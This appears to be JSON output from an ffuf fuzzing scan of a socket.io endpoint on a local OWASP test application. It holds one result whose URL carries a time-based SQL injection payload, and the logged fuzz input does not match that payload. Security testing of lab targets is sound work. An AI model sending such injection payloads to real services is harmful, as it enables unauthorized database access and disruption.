{"commandline":"ffuf -w /Users/raphaelpang/code/elise/payloads/temp/fe4a2941-51a6-49b5-9488-0d8e38a3864c.txt -t 25 -mc 200,302,400,401,403,404,500 -timeout 30 -ac -json -o /Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755713886294.json -u http://localhost:8082/OWASP/socket.io/?EIO=4\u0026transport=polling\u0026t=PZ8hHOk\u0026transport=FUZZ -H referer: http://localhost:8082/OWASP -H user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.7204.23 Safari/537.36 -H accept: */*","time":"2025-08-21T02:18:06+08:00","results":[{"input":{"FFUFHASH":"b13011","FUZZ":".htaccessAePOHFTW"},"position":1,"status":400,"length":0,"words":1,"lines":1,"content-type":"","redirectlocation":"","scraper":{},"duration":800917,"resultfile":"","url":"http://localhost:8082/OWASP/socket.io/?EIO=4\u0026transport=polling\u0026t=PZ8hHOk\u0026transport=';WAITFOR DELAY '0:0:5'--","host":"localhost:8082"}],"config":{"autocalibration":true,"autocalibration_keyword":"FUZZ","autocalibration_perhost":false,"autocalibration_strategies":["basic"],"autocalibration_strings":[],"colors":false,"cmdline":"ffuf -w /Users/raphaelpang/code/elise/payloads/temp/fe4a2941-51a6-49b5-9488-0d8e38a3864c.txt -t 25 -mc 200,302,400,401,403,404,500 -timeout 30 -ac -json -o /Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755713886294.json -u http://localhost:8082/OWASP/socket.io/?EIO=4\u0026transport=polling\u0026t=PZ8hHOk\u0026transport=FUZZ -H referer: http://localhost:8082/OWASP -H user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.7204.23 Safari/537.36 -H accept: */*","configfile":"","postdata":"","debuglog":"","delay":{"value":"0.00"},"dirsearch_compatibility":false,"encoders":[],"extensions":[],"fmode":"or","follow_redirects":false,"headers":{"Accept":"*/*","Referer":"http://localhost:8082/OWASP","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.7204.23 Safari/537.36"},"ignorebody":false,"ignore_wordlist_comments":false,"inputmode":"clusterbomb","cmd_inputnum":100,"inputproviders":[{"name":"wordlist","keyword":"FUZZ","value":"/Users/raphaelpang/code/elise/payloads/temp/fe4a2941-51a6-49b5-9488-0d8e38a3864c.txt","encoders":"","template":""}],"inputshell":"","json":true,"matchers":{"IsCalibrated":true,"Mutex":{},"Matchers":{"status":{"value":"200,302,400,401,403,404,500"}},"Filters":{"size":{"value":"80117"}},"PerDomainFilters":{}},"mmode":"or","maxtime":0,"maxtime_job":0,"method":"GET","noninteractive":false,"outputdirectory":"","outputfile":"/Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755713886294.json","outputformat":"json","OutputSkipEmptyFile":false,"proxyurl":"","quiet":false,"rate":0,"raw":false,"recursion":false,"recursion_depth":0,"recursion_strategy":"default","replayproxyurl":"","requestfile":"","requestproto":"https","scraperfile":"","scrapers":"all","sni":"","stop_403":false,"stop_all":false,"stop_errors":false,"threads":25,"timeout":30,"url":"http://localhost:8082/OWASP/socket.io/?EIO=4\u0026transport=polling\u0026t=PZ8hHOk\u0026transport=FUZZ","verbose":false,"wordlists":["/Users/raphaelpang/code/elise/payloads/temp/fe4a2941-51a6-49b5-9488-0d8e38a3864c.txt"],"http2":false,"client-cert":"","client-key":""}}